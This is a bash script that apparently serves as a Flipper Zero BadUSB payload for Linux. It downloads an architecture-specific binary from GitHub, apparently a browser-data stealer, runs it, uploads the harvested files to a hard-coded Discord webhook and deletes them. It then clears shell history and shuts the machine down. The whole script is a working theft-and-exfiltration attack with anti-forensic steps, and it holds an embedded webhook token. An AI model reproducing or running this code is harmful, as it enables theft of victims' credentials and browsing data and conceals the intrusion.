#!/bin/bash
export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"

folder="$PWD"
folder_path="$folder/results/"
files=()

architecture=$(uname -m)

case "$architecture" in
    "x86_64")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64"
        ;;
    "i386" | "i686")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_386"
        ;;
    "arm" | "armv71")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_arm"
        ;;
    "aarch64")
        file_url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_386"
        ;;
    *)
        echo "Architecture non supportée : $architecture"
        exit 1
        ;;
esac

curl -sSL $file_url -o magikarp.sh

chmod +x magikarp.sh
echo "Exécution du script"
./magikarp.sh
rm "magikarp.sh"
files=($(find "$folder_path" -type f))

curl_args=()
for ((i=0; i<${#files[@]}; i++)); do
    file="${files[$i]}"
    curl_args+=("-F" "file$((i+1))=@$file")
done

curl "${curl_args[@]}" \
    -F 'payload_json={"username": "Murerig", "content": "Coin Coin 😈🦆"}' \
    $WEBHOOK_URL

rm -rf $folder_path
history -c
shutdown -h now